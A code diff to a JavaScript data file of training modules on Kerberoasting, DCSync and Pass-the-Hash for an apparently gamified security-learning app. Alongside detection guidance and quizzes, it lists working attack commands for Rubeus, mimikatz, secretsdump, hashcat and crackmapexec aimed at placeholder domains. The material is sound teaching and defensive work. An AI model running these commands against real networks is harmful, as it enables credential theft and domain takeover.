@@ -1,3 +1,10 @@
+// client/src/data/theory/index.js
+
+/**
+ * Theory modules for interactive learning
+ * Each module provides educational content before scenarios
+ */
+
 export const theoryModules = {
   'kerberoasting': {
     id: 'kerberoasting',
@@ -6,60 +13,6 @@ export const theoryModules = {
     estimatedTime: '15 minutes',
     difficulty: 'Intermediate',
     xpReward: 150,
-    prerequisites: ['ad-basics', 'kerberos-101'],
-    
-    // Learning objectives
-    objectives: [
-      'Understand how Kerberos service authentication works',
-      'Identify service accounts vulnerable to Kerberoasting',
-      'Execute the attack using modern tools',
-      'Recognize detection methods and defensive measures'
-    ],
-    
-    // Multiple learning modes
-    learningModes: {
-      guided: {
-        name: 'Guided Tutorial',
-        icon: '🎓',
-        description: 'Step-by-step walkthrough with explanations',
-        recommended: true
-      },
-      interactive: {
-        name: 'Interactive Lab',
-        icon: '🔬',
-        description: 'Hands-on practice with real commands',
-        unlockCondition: 'complete_guided'
-      },
-      video: {
-        name: 'Video Lesson',
-        icon: '🎬',
-        description: '10-minute video explanation',
-        videoUrl: 'https://youtube.com/...' // Optional
-      },
-      flashcards: {
-        name: 'Quick Review',
-        icon: '🗂️',
-        description: 'Flashcards for quick concept review'
-      }
-    },
-    
-    // Visual learning aids
-    visuals: {
-      heroImage: '/assets/kerberoasting-hero.svg',
-      conceptMap: '/assets/kerberoasting-concept-map.svg',
-      flowDiagram: {
-        nodes: [
-          { id: 'user', label: 'Authenticated User', type: 'actor', x: 50, y: 100 },
-          { id: 'dc', label: 'Domain Controller', type: 'server', x: 300, y: 100 },
-          { id: 'service', label: 'Service Account', type: 'target', x: 550, y: 100 }
-        ],
-        connections: [
-          { from: 'user', to: 'dc', label: 'Request TGS', color: 'blue', animated: true },
-          { from: 'dc', to: 'user', label: 'Encrypted TGS', color: 'red', animated: true },
-          { from: 'user', to: 'service', label: 'Access with TGS', color: 'green', animated: false }
-        ]
-      }
-    },
     
     sections: [
       {
@@ -73,506 +26,526 @@ export const theoryModules = {
 
 **Real-world impact:** Used in 60%+ of AD compromises, including major ransomware attacks.`,
         
-        callout: {
-          type: 'important',
-          title: 'Critical Insight',
-          content: 'Any authenticated domain user can request service tickets - no special privileges required!'
-        },
-        
-        interactiveElement: {
-          type: 'thought-question',
-          question: 'Before we continue: What do you think makes service accounts attractive targets?',
-          hints: ['Think about passwords', 'Consider permissions', 'Who manages them?']
-        }
+        keyPoints: [
+          'Any authenticated domain user can request service tickets',
+          'Service tickets are encrypted with the service account password',
+          'Offline brute-force attack on encrypted tickets',
+          'No special privileges required to perform the attack'
+        ]
       },
       
       {
         id: 'kerberos-fundamentals',
-        title: '🔐 Kerberos Authentication Crash Course',
+        title: '🔐 Kerberos Authentication Overview',
         type: 'concept',
         duration: '3 min',
-        
-        // Tabbed content for different learning styles
-        contentTabs: [
-          {
-            name: 'Simple Explanation',
-            icon: '👶',
-            content: `Think of Kerberos like a school system:
-            
-1. **Student Badge (TGT)**: You show your ID to the office and get a student badge
-2. **Class Pass (TGS)**: You show your badge to get permission slips for specific classes
-3. **Enter Class (Service Access)**: You show your permission slip to enter the classroom
+        content: `Kerberos is a network authentication protocol that uses tickets to authenticate users and services.
 
-The "permission slip" is encrypted with the teacher's (service account's) password!`
-          },
-          {
-            name: 'Technical Details',
-            icon: '🔬',
-            content: `Kerberos is a network authentication protocol using symmetric key cryptography:
-
-**Components:**
-- **KDC (Key Distribution Center)**: Authentication server on DC
+**Key Components:**
 - **TGT (Ticket Granting Ticket)**: Proves user authentication
 - **TGS (Ticket Granting Service)**: Issues service tickets
-- **Service Ticket**: Encrypted with service account NTLM hash
+- **Service Ticket**: Encrypted with service account password hash
 
 **The Vulnerability:**
-Service tickets are encrypted with the service account's password hash, which means if we can capture the ticket, we can crack it offline.`
-          },
-          {
-            name: 'Visual Diagram',
-            icon: '📊',
-            content: 'interactive-diagram', // Triggers diagram rendering
-            diagram: 'kerberos-flow'
-          }
-        ],
+Service tickets can be requested by any authenticated user, and they're encrypted with the service account's password hash. This means we can capture the ticket and crack it offline!`,
         
-        keyTerms: {
-          'TGT': 'Ticket Granting Ticket - Proves you\'re an authenticated user',
-          'TGS': 'Ticket Granting Service - Issues tickets for specific services',
-          'SPN': 'Service Principal Name - Unique identifier for services',
-          'RC4': 'Legacy encryption algorithm (weaker, faster to crack)'
+        example: {
+          title: 'Kerberos Authentication Flow',
+          code: `1. User authenticates → Receives TGT
+2. User requests service access → DC issues TGS ticket
+3. TGS encrypted with service account password
+4. Attacker captures ticket → Cracks offline`
         }
       },
       
       {
-        id: 'spn-deep-dive',
+        id: 'spn-explanation',
         title: '🎯 Service Principal Names (SPNs)',
         type: 'concept',
         duration: '3 min',
-        
-        content: `SPNs are the linchpin of Kerberoasting. They're unique identifiers that map services to service accounts.`,
-        
-        // Interactive command explorer
-        interactiveCommands: [
-          {
-            command: 'setspn -L svc_sql',
-            description: 'List SPNs for a service account',
-            output: `Registered ServicePrincipalNames for CN=svc_sql,OU=ServiceAccounts,DC=contoso,DC=local:
-    MSSQLSvc/SQL01.contoso.local:1433
-    MSSQLSvc/SQL01.contoso.local`,
-            explanation: 'This shows two SPNs registered to the svc_sql account - one with port, one without',
-            tryItButton: true
-          },
-          {
-            command: 'Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName',
-            description: 'Find all accounts with SPNs (PowerShell)',
-            output: `DistinguishedName : CN=svc_sql,OU=ServiceAccounts,DC=contoso,DC=local
-ServicePrincipalName : {MSSQLSvc/SQL01.contoso.local:1433}
+        content: `Service Principal Names (SPNs) are unique identifiers that link services to service accounts in Active Directory.
 
-DistinguishedName : CN=svc_web,OU=ServiceAccounts,DC=contoso,DC=local  
-ServicePrincipalName : {HTTP/web.contoso.local}`,
-            explanation: 'PowerShell provides more detailed output including account DN'
-          }
-        ],
+**Format:** ServiceClass/Host:Port
+**Example:** MSSQLSvc/SQL01.contoso.local:1433`,
         
-        // Quiz question embedded in content
-        checkYourUnderstanding: {
-          question: 'What information does an SPN provide?',
-          options: [
-            'The service account password',
-            'The service type, host, and port',
-            'The domain administrator credentials',
-            'The user\'s TGT'
-          ],
-          correct: 1,
-          explanation: 'SPNs follow the format ServiceClass/Host:Port, identifying exactly which service is running where.'
-        }
+        example: {
+          title: 'Finding SPNs',
+          code: `# PowerShell
+Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
+
+# PowerView
+Get-DomainUser -SPN
+
+# Impacket
+GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10`
+        },
+        
+        keyPoints: [
+          'SPNs map services to accounts',
+          'One account can have multiple SPNs',
+          'Required for Kerberos authentication to services',
+          'Easily enumerable by any domain user'
+        ]
       },
       
       {
-        id: 'attack-walkthrough',
-        title: '⚔️ The Attack Process',
-        type: 'interactive-tutorial',
+        id: 'attack-process',
+        title: '⚔️ Attack Execution Steps',
+        type: 'steps',
         duration: '5 min',
+        content: 'Follow these steps to perform a Kerberoasting attack:',
         
         steps: [
           {
             number: 1,
             title: 'Enumerate SPNs',
-            description: 'Find all service accounts in the domain',
-            
-            // Multiple tool options
-            toolOptions: [
-              {
-                name: 'PowerView',
-                recommended: true,
-                command: 'Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName',
-                pros: ['Native PowerShell', 'Detailed output', 'Built-in filtering'],
-                cons: ['Requires PowerView', 'Can be flagged by AV']
-              },
-              {
-                name: 'Impacket',
-                command: 'GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10',
-                pros: ['Works from Linux', 'Stealthy', 'No AV concerns'],
-                cons: ['Requires network access', 'Python dependency']
-              },
-              {
-                name: 'Native Windows',
-                command: 'setspn -Q */*',
-                pros: ['No tools needed', 'Very stealthy', 'Always available'],
-                cons: ['Limited output format', 'Harder to parse']
-              }
-            ],
-            
-            expectedOutput: `svc_sql
-    MSSQLSvc/SQL01.contoso.local:1433
-    
-svc_web
-    HTTP/web.contoso.local
-    
-svc_backup
-    CIFS/BACKUP01.contoso.local`,
-            
-            hints: [
-              'Look for accounts with ServicePrincipalName attribute set',
-              'Service accounts often have "svc_" prefix',
-              'Focus on high-value services (SQL, IIS, CIFS)'
-            ],
-            
-            redTeamTip: {
-              icon: '🎩',
-              content: 'Pro tip: Target accounts with AdminCount=1 first - they often have Domain Admin privileges!'
-            }
+            description: 'Find all service accounts with registered SPNs',
+            commands: [
+              'Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName',
+              'GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10'
+            ]
           },
-          
           {
             number: 2,
             title: 'Request Service Tickets',
-            description: 'Ask the DC for tickets encrypted with service account hashes',
-            
-            // Side-by-side comparison
-            comparison: {
-              method1: {
-                name: 'Rubeus (Recommended)',
-                command: 'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt',
-                advantages: [
-                  'Single command execution',
-                  'Automatic hash formatting',
-                  'Can target specific users',
-                  'Supports filtering by encryption type'
-                ],
-                output: `[*] Action: Kerberoasting
-[*] SPN: MSSQLSvc/SQL01.contoso.local:1433
-[*] Hash written to hashes.txt`,
-                screenshot: '/assets/rubeus-output.png'
-              },
-              method2: {
-                name: 'Manual PowerShell',
-                command: `Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.contoso.local:1433"`,
-                advantages: [
-                  'No external tools',
-                  'Scriptable',
-                  'Very stealthy'
-                ],
-                disadvantages: [
-                  'Multi-step process',
-                  'Manual extraction needed',
-                  'Harder to format output'
-                ]
-              }
-            },
-            
-            securityNote: {
-              type: 'warning',
-              content: 'This generates Event ID 4769 on the DC. Requesting many tickets in succession is a red flag!'
-            }
+            description: 'Request TGS tickets for discovered SPNs',
+            commands: [
+              'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt',
+              'GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10 -request'
+            ]
           },
-          
           {
             number: 3,
-            title: 'Crack the Hashes',
-            description: 'Use offline cracking to recover passwords',
-            
-            crackingGuide: {
-              hashFormats: [
-                {
-                  type: 'Hashcat (Type 13100)',
-                  example: '$krb5tgs$23$*user$realm$spn*$hash...',
-                  detectBy: 'Starts with $krb5tgs$23$'
-                },
-                {
-                  type: 'John the Ripper',
-                  example: '$krb5tgs$23$*...',
-                  detectBy: 'Same format, different tool'
-                }
-              ],
-              
-              commands: [
-                {
-                  tool: 'Hashcat',
-                  command: 'hashcat -m 13100 -a 0 hashes.txt rockyou.txt',
-                  explanation: '-m 13100 = Kerberos TGS-REP, -a 0 = dictionary attack',
-                  estimatedTime: 'Depends on password complexity and hardware',
-                  gpuBenchmark: '~200,000 H/s on RTX 3080'
-                },
-                {
-                  tool: 'John the Ripper',
-                  command: 'john --format=krb5tgs --wordlist=rockyou.txt hashes.txt',
-                  explanation: 'Alternative to hashcat, slower but more compatible'
-                }
-              ],
-              
-              tips: [
-                'Start with common passwords (Summer2023!, Password123!)',
-                'Service accounts often use predictable patterns',
-                'Use company name + season + year as wordlist base',
-                'GPU cracking is 100x faster than CPU'
-              ]
-            },
-            
-            successOutput: `$krb5tgs$23$*svc_sql$CONTOSO.LOCAL$MSSQLSvc/SQL01*$...:P@ssw0rd123!
-
-Status: Cracked
-Time: 2 minutes 37 seconds
-Attempts: 45,234,891`,
-            
-            celebration: {
-              message: '🎉 Password cracked! This account likely has database access.',
-              nextSteps: [
-                'Test credentials with CrackMapExec',
-                'Check if account has admin rights',
-                'Look for sensitive data access'
-              ]
-            }
+            title: 'Extract Tickets',
+            description: 'Export the encrypted service tickets',
+            commands: [
+              'Invoke-Mimikatz -Command "kerberos::list /export"',
+              'klist (to view cached tickets)'
+            ]
           },
-          
           {
             number: 4,
-            title: 'Validate & Exploit',
-            description: 'Confirm access and use the compromised account',
-            
-            validationCommands: [
-              {
-                purpose: 'Test authentication',
-                command: 'crackmapexec smb 10.0.1.0/24 -u svc_sql -p "P@ssw0rd123!"',
-                successIndicator: 'Pwn3d!'
-              },
-              {
-                purpose: 'Check admin access',
-                command: 'crackmapexec smb 10.0.1.10 -u svc_sql -p "P@ssw0rd123!" -x whoami',
-                successIndicator: 'contoso\\svc_sql'
-              }
-            ],
-            
-            escalationPaths: [
-              {
-                scenario: 'Database Admin',
-                description: 'Service account has sysadmin on SQL Server',
-                exploitation: 'Use xp_cmdshell for code execution',
-                impact: 'Access to all databases, potential lateral movement'
-              },
-              {
-                scenario: 'Domain Admin',
-                description: 'Account is member of Domain Admins',
-                exploitation: 'DCSync attack to dump all domain hashes',
-                impact: 'Complete domain compromise'
-              }
+            title: 'Crack Offline',
+            description: 'Use hashcat or john to crack the password',
+            commands: [
+              'hashcat -m 13100 -a 0 hashes.txt rockyou.txt',
+              'john --format=krb5tgs hashes.txt'
             ]
           }
-        ],
+        ]
+      },
+      
+      {
+        id: 'defense',
+        title: '🛡️ Detection & Prevention',
+        type: 'defensive',
+        duration: '3 min',
+        content: 'Understanding defensive measures is crucial for security professionals.',
         
-        // Interactive practice at the end
-        practiceChallenge: {
-          title: 'Try It Yourself',
-          description: 'Complete this mini-challenge before moving on',
-          task: 'Identify which command would extract SPNs for accounts in the "Service Accounts" OU',
-          options: [
-            'Get-ADUser -SearchBase "OU=Service Accounts,DC=contoso,DC=local" -Filter * -Properties ServicePrincipalName',
-            'Get-DomainUser -LDAPFilter "(servicePrincipalName=*)"',
-            'setspn -Q "OU=Service Accounts"',
-            'Rubeus.exe kerberoast /ou:"Service Accounts"'
+        detection: {
+          logs: [
+            'Event ID 4769: Kerberos service ticket requested',
+            'Look for multiple 4769 events from single user',
+            'Monitor for RC4 encryption usage (should be rare)'
           ],
-          correct: 0,
-          explanation: 'Option 1 uses AD PowerShell with -SearchBase to target a specific OU and retrieves the SPN property.'
+          indicators: [
+            'Multiple service ticket requests in short time',
+            'Service ticket requests for high-value SPNs',
+            'Unusual RC4 encryption in ticket requests'
+          ]
+        },
+        
+        prevention: [
+          {
+            title: 'Strong Service Account Passwords',
+            description: 'Use passwords >25 characters for service accounts',
+            example: 'Implement password manager for complex passwords'
+          },
+          {
+            title: 'Group Managed Service Accounts (gMSA)',
+            description: 'Use gMSA with 128-character auto-rotating passwords',
+            example: 'New-ADServiceAccount -Name gMSA_SQL01'
+          },
+          {
+            title: 'Disable RC4 Encryption',
+            description: 'Force AES-256 encryption via Group Policy',
+            example: 'Network security: Configure encryption types allowed for Kerberos'
+          },
+          {
+            title: 'Least Privilege',
+            description: 'Remove unnecessary admin rights from service accounts',
+            example: 'Regular audit of service account permissions'
+          }
+        ]
+      }
+    ],
+    
+    quiz: [
+      {
+        question: 'What encryption is used for service tickets in Kerberoasting?',
+        options: [
+          'The service account\'s password hash',
+          'The domain administrator\'s password',
+          'The user\'s password hash',
+          'A random session key'
+        ],
+        correct: 0,
+        explanation: 'Service tickets (TGS) are encrypted with the hash of the service account\'s password, which allows offline cracking.'
+      },
+      {
+        question: 'Which is the BEST defense against Kerberoasting?',
+        options: [
+          'Disable Kerberos authentication',
+          'Use Group Managed Service Accounts (gMSA)',
+          'Remove all SPNs from Active Directory',
+          'Block port 88'
+        ],
+        correct: 1,
+        explanation: 'gMSAs use 128-character auto-rotating passwords that are virtually impossible to crack.'
+      },
+      {
+        question: 'What permissions are required to request service tickets?',
+        options: [
+          'Domain Admin',
+          'Local Admin on target server',
+          'Any authenticated domain user',
+          'Service account permissions'
+        ],
+        correct: 2,
+        explanation: 'Any authenticated domain user can request service tickets - no special privileges needed!'
+      }
+    ],
+    
+    resources: [
+      {
+        title: 'MITRE ATT&CK - Kerberoasting',
+        url: 'https://attack.mitre.org/techniques/T1558/003/',
+        type: 'reference'
+      },
+      {
+        title: 'Rubeus Tool',
+        url: 'https://github.com/GhostPack/Rubeus',
+        type: 'tool'
+      }
+    ]
+  },
+
+  'dcsync': {
+    id: 'dcsync',
+    title: 'DCSync Attack Deep Dive',
+    subtitle: 'Extract domain credentials like a Domain Controller',
+    estimatedTime: '12 minutes',
+    difficulty: 'Advanced',
+    xpReward: 200,
+    
+    sections: [
+      {
+        id: 'intro',
+        title: '🎯 What is DCSync?',
+        type: 'intro',
+        duration: '2 min',
+        content: `DCSync is a powerful attack that allows an attacker to impersonate a Domain Controller and request password hashes for any user through the Directory Replication Service Remote Protocol (MS-DRSR).
+
+**Critical Impact:** With DCSync, you can extract the krbtgt hash and create Golden Tickets for persistent domain admin access.`,
+        
+        keyPoints: [
+          'Abuses legitimate AD replication protocol',
+          'Extracts password hashes without touching LSASS',
+          'Requires specific replication permissions',
+          'Can extract krbtgt hash for Golden Ticket attacks'
+        ]
+      },
+      
+      {
+        id: 'replication',
+        title: '🔄 Active Directory Replication',
+        type: 'concept',
+        duration: '3 min',
+        content: `Active Directory uses multi-master replication between Domain Controllers. DCSync exploits this legitimate mechanism.
+
+**Normal Replication:** DCs replicate changes using the Directory Replication Service (DRS), including password hashes.
+
+**The Attack:** An attacker with replication permissions can pretend to be a DC and request any object's data.`,
+        
+        example: {
+          title: 'Required Permissions',
+          code: `DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
+DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
+
+Default holders:
+- Domain Admins
+- Enterprise Admins
+- Administrators
+- Domain Controllers`
         }
       },
       
       {
-        id: 'defense-blue-team',
-        title: '🛡️ Defense & Detection',
+        id: 'attack-steps',
+        title: '⚔️ Executing DCSync',
+        type: 'steps',
+        duration: '4 min',
+        content: 'Steps to perform a DCSync attack:',
+        
+        steps: [
+          {
+            number: 1,
+            title: 'Verify Permissions',
+            description: 'Check if compromised account has replication rights',
+            commands: [
+              'Get-DomainObjectAcl -SearchBase "DC=contoso,DC=local" -ResolveGUIDs'
+            ]
+          },
+          {
+            number: 2,
+            title: 'Execute DCSync',
+            description: 'Use Mimikatz or Impacket to perform replication',
+            commands: [
+              'mimikatz # lsadump::dcsync /domain:contoso.local /user:Administrator',
+              'secretsdump.py contoso.local/user:password@dc01.contoso.local'
+            ]
+          },
+          {
+            number: 3,
+            title: 'Extract Hashes',
+            description: 'Receive NTLM and Kerberos hashes',
+            commands: [
+              'Use hashes for Pass-the-Hash attacks',
+              'Create Golden Tickets with krbtgt hash'
+            ]
+          }
+        ]
+      },
+      
+      {
+        id: 'defense',
+        title: '🛡️ Detection & Mitigation',
         type: 'defensive',
         duration: '3 min',
+        content: 'Detecting and preventing DCSync attacks.',
         
-        perspective: 'blue-team',
-        
-        detectionMethods: [
-          {
-            level: 'basic',
-            name: 'Event Log Monitoring',
-            description: 'Monitor for suspicious Kerberos ticket requests',
-            
-            splunkQuery: `index=windows EventCode=4769 
-| where Ticket_Encryption_Type="0x17" 
-| stats count by Account_Name 
-| where count > 10`,
-            
-            whatToLookFor: [
-              'Multiple 4769 events from single user',
-              'RC4 encryption (0x17) instead of AES',
-              'Requests for service tickets outside business hours',
-              'Tickets for sensitive SPNs (SQL, Exchange)'
-            ],
-            
-            falsePositives: [
-              'Legitimate service accounts requesting tickets',
-              'Scheduled tasks using service accounts',
-              'Monitoring tools querying services'
-            ]
-          },
-          
-          {
-            level: 'intermediate',
-            name: 'Honeypot Accounts',
-            description: 'Create fake service accounts to detect attackers',
-            
-            implementation: `# Create honeypot service account
-New-ADUser -Name "svc_backup_admin" -AccountPassword (ConvertTo-SecureString "HoneypotP@ss123!" -AsPlainText -Force) -Enabled $true
-
-# Register fake SPN
-setspn -A MSSQL/HONEYPOT.contoso.local:1433 svc_backup_admin
-
-# Set up alert
-# Any authentication attempt = confirmed attack`,
-            
-            advantages: [
-              'High-fidelity detection (very few false positives)',
-              'Catches both manual and automated attacks',
-              'Can track attacker tools and techniques'
-            ]
-          },
-          
-          {
-            level: 'advanced',
-            name: 'Kerberos Armoring',
-            description: 'Implement Flexible Authentication Secure Tunneling (FAST)',
-            technicalDetails: 'Wraps Kerberos messages in encrypted channel, preventing offline cracking'
-          }
-        ],
-        
-        preventionStrategies: [
-          {
-            priority: 'critical',
-            strategy: 'Strong Service Account Passwords',
-            implementation: '> 25 characters, random, rotated every 90 days',
-            effectiveness: '99%',
-            effort: 'Low',
-            cost: 'Free',
-            howTo: `# Generate secure password
-$password = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
-
-# Set password
-Set-ADAccountPassword -Identity svc_sql -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force)`
-          },
-          
-          {
-            priority: 'critical',
-            strategy: 'Group Managed Service Accounts (gMSA)',
-            implementation: 'Use gMSA for all service accounts',
-            effectiveness: '100%',
-            effort: 'Medium',
-            cost: 'Free (requires Server 2012+)',
-            benefits: [
-              'Automatic 128-character password',
-              'Automatic password rotation every 30 days',
-              'Impossible to Kerberoast effectively',
-              'Centralized management'
-            ],
-            limitations: [
-              'Requires Windows Server 2012 or later',
-              'Service must support gMSA',
-              'Some third-party apps don\'t support it'
-            ]
-          },
-          
-          {
-            priority: 'high',
-            strategy: 'Disable RC4 Encryption',
-            implementation: 'Force AES-256 encryption for Kerberos',
-            effectiveness: '80%',
-            note: 'Makes cracking significantly slower but doesn\'t prevent the attack',
-            gpoPath: 'Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Network security: Configure encryption types allowed for Kerberos'
-          },
-          
-          {
-            priority: 'high',
-            strategy: 'Principle of Least Privilege',
-            implementation: 'Remove unnecessary permissions from service accounts',
-            effectiveness: '60% (reduces impact)',
-            checklist: [
-              '✓ Remove from Domain Admins group',
-              '✓ Grant only required database permissions',
-              '✓ Use separate accounts per service',
-              '✓ Regularly audit permissions'
-            ]
-          }
-        ],
-        
-        // Incident response playbook
-        incidentResponse: {
-          title: 'If You Detect Kerberoasting',
-          steps: [
-            {
-              step: 1,
-              action: 'Identify compromised accounts',
-              details: 'Review Event ID 4769 logs to find targeted SPNs'
-            },
-            {
-              step: 2,
-              action: 'Reset passwords immediately',
-              details: 'Change passwords to 30+ character random strings',
-              urgency: 'CRITICAL - Do this first!'
-            },
-            {
-              step: 3,
-              action: 'Revoke active sessions',
-              details: 'klist purge on all systems, revoke Kerberos tickets'
-            },
-            {
-              step: 4,
-              action: 'Hunt for lateral movement',
-              details: 'Check if compromised account was used to access other systems'
-            },
-            {
-              step: 5,
-              action: 'Implement mitigations',
-              details: 'Deploy gMSA, strengthen monitoring, update password policy'
-            }
+        detection: {
+          logs: [
+            'Event ID 4662: An operation was performed on an object',
+            'Directory Service Access auditing must be enabled',
+            'Monitor replication requests from non-DC computers'
+          ],
+          indicators: [
+            'Event 4662 with Replication-Get-Changes GUIDs',
+            'Replication requests from workstations',
+            'Unusual accounts performing replication'
           ]
         },
         
-        realWorldExample: {
-          title: 'Case Study: Healthcare Ransomware',
-          scenario: 'Attackers used Kerberoasting to compromise svc_backup account with DA privileges',
-          timeline: [
-            { time: 'Day 1', event: 'Initial access via phishing' },
-            { time: 'Day 2', event: 'Kerberoasting attack, cracked password in 4 hours' },
-            { time: 'Day 3', event: 'Lateral movement using compromised service account' },
-            { time: 'Day 5', event: 'Ransomware deployed domain-wide' }
-          ],
-          outcome: '$2.5M ransom, 3 weeks of downtime',
-          prevention: 'gMSA would have prevented this entirely'
-        }
+        prevention: [
+          {
+            title: 'Limit Replication Permissions',
+            description: 'Regularly audit who has replication rights',
+            example: 'Remove unnecessary accounts from privileged groups'
+          },
+          {
+            title: 'Protected Users Group',
+            description: 'Add high-value accounts to Protected Users',
+            example: 'Prevents NTLM hash replication for these users'
+          },
+          {
+            title: 'Enable Advanced Auditing',
+            description: 'Configure Directory Service Access auditing',
+            example: 'auditpol /set /subcategory:"Directory Service Access" /success:enable'
+          }
+        ]
       }
     ],
     
-    // Final assessment
-    finalAssessment: {
-      type: 'comprehensive-quiz',
-      passingScore: 80,
-      questions: [
-        // ... quiz questions from before ...
-      ]
-    },
+    quiz: [
+      {
+        question: 'What protocol does DCSync abuse?',
+        options: [
+          'LDAP',
+          'MS-DRSR (Directory Replication Service)',
+          'SMB',
+          'RPC'
+        ],
+        correct: 1,
+        explanation: 'DCSync abuses the MS-DRSR protocol used for legitimate replication between Domain Controllers.'
+      },
+      {
+        question: 'Which permission is NOT required for DCSync?',
+        options: [
+          'DS-Replication-Get-Changes',
+          'DS-Replication-Get-Changes-All',
+          'GenericAll on domain object',
+          'Local Administrator on the DC'
+        ],
+        correct: 3,
+        explanation: 'DCSync does not require local admin access to the DC, only the replication permissions.'
+      }
+    ],
     
-    // Completion rewards
-    completion: {
-      xp: 150,
-      badge: 'kerberoasting-expert',
-      unlocksScenario: 'kerberoasting',
-      certificate: true,
-      nextRecommended: ['as-rep-roasting', 'pass-the-ticket']
-    }
+    resources: [
+      {
+        title: 'MITRE ATT&CK - DCSync',
+        url: 'https://attack.mitre.org/techniques/T1003/006/',
+        type: 'reference'
+      }
+    ]
+  },
+
+  'pass-the-hash': {
+    id: 'pass-the-hash',
+    title: 'Pass-the-Hash Attack',
+    subtitle: 'Authenticate without knowing the plaintext password',
+    estimatedTime: '10 minutes',
+    difficulty: 'Intermediate',
+    xpReward: 120,
+    
+    sections: [
+      {
+        id: 'intro',
+        title: '🎯 What is Pass-the-Hash?',
+        type: 'intro',
+        duration: '2 min',
+        content: `Pass-the-Hash (PtH) is an attack where an attacker uses a password hash (usually NTLM) instead of the plaintext password to authenticate to remote systems.
+
+**Key Insight:** Windows authentication protocols like NTLM don't require the plaintext password - the hash is sufficient!`,
+        
+        keyPoints: [
+          'Uses password hash instead of plaintext password',
+          'Works with NTLM authentication',
+          'No need to crack the hash',
+          'Common lateral movement technique'
+        ]
+      },
+      
+      {
+        id: 'how-it-works',
+        title: '🔐 How NTLM Authentication Works',
+        type: 'concept',
+        duration: '3 min',
+        content: `NTLM authentication uses a challenge-response mechanism where the password hash (not plaintext) is used for authentication.
+
+**The Vulnerability:** If you have the hash, you can authenticate without ever knowing the actual password.`,
+        
+        example: {
+          title: 'NTLM Hash Format',
+          code: `Username:RID:LM Hash:NTLM Hash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+The second hash (NTLM) is what we need for PtH attacks.`
+        }
+      },
+      
+      {
+        id: 'attack-steps',
+        title: '⚔️ Executing Pass-the-Hash',
+        type: 'steps',
+        duration: '3 min',
+        
+        steps: [
+          {
+            number: 1,
+            title: 'Obtain Password Hash',
+            description: 'Extract NTLM hash from compromised system',
+            commands: [
+              'mimikatz # sekurlsa::logonpasswords',
+              'secretsdump.py user:password@target'
+            ]
+          },
+          {
+            number: 2,
+            title: 'Use Hash for Authentication',
+            description: 'Authenticate to remote systems using the hash',
+            commands: [
+              'mimikatz # sekurlsa::pth /user:admin /domain:contoso /ntlm:hash /run:cmd',
+              'pth-winexe -U admin%hash //10.0.1.10 cmd'
+            ]
+          },
+          {
+            number: 3,
+            title: 'Lateral Movement',
+            description: 'Move to other systems using the compromised account',
+            commands: [
+              'crackmapexec smb 10.0.1.0/24 -u admin -H hash',
+              'psexec.py -hashes :hash admin@10.0.1.10'
+            ]
+          }
+        ]
+      },
+      
+      {
+        id: 'defense',
+        title: '🛡️ Mitigation Strategies',
+        type: 'defensive',
+        duration: '2 min',
+        
+        prevention: [
+          {
+            title: 'Disable NTLM',
+            description: 'Force Kerberos-only authentication',
+            example: 'Network security: Restrict NTLM: Incoming NTLM traffic'
+          },
+          {
+            title: 'Protected Users Group',
+            description: 'Prevents NTLM for member accounts',
+            example: 'Add privileged accounts to Protected Users'
+          },
+          {
+            title: 'Credential Guard',
+            description: 'Protects credentials using virtualization security',
+            example: 'Enable on Windows 10/Server 2016+'
+          }
+        ]
+      }
+    ],
+    
+    quiz: [
+      {
+        question: 'What is required to perform Pass-the-Hash?',
+        options: [
+          'The plaintext password',
+          'The NTLM hash',
+          'A Kerberos ticket',
+          'Domain Admin privileges'
+        ],
+        correct: 1,
+        explanation: 'Pass-the-Hash only requires the NTLM hash, not the plaintext password.'
+      }
+    ],
+    
+    resources: [
+      {
+        title: 'MITRE ATT&CK - Pass the Hash',
+        url: 'https://attack.mitre.org/techniques/T1550/002/',
+        type: 'reference'
+      }
+    ]
   }
+};
+
+/**
+ * Get theory module by scenario ID
+ */
+export const getTheoryModule = (scenarioId) => {
+  return theoryModules[scenarioId] || null;
+};
+
+/**
+ * Check if scenario has theory module
+ */
+export const hasTheoryModule = (scenarioId) => {
+  return scenarioId in theoryModules;
+};
+
+/**
+ * Get all theory modules
+ */
+export const getAllTheoryModules = () => {
+  return Object.values(theoryModules);
+};
+
+/**
+ * Get theory modules by difficulty
+ */
+export const getTheoryModulesByDifficulty = (difficulty) => {
+  return Object.values(theoryModules).filter(module => module.difficulty === difficulty);
 };
